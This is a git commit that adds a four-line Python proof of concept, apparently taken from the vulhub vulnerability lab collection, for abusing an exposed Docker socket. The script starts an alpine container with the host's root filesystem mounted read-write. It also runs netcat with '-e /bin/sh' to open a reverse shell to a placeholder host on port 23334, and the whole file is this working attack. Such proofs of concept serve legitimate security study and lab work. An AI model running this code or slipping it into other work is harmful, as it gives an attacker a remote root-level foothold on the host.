969fb040ae7cf0e3c004f3b96a8b834cdb3d3525
neargle <nearg1e.com@gmail.com>
2020-05-15 10:27:54 +0800

    add poc from vulhub

---
+++ docker_api/poc.py
@@ -0,0 +1,4 @@
+import docker
+client = docker.DockerClient(base_url='unix:///var/run/docker.sock')
+data = client.containers.run('alpine:latest', r'''sh -c "/usr/bin/nc xxxx 23334 -e /bin/sh" ''', remove=True, volumes={'/': {'bind': '/tmp/root', 'mode': 'rw'}})
+print(data)
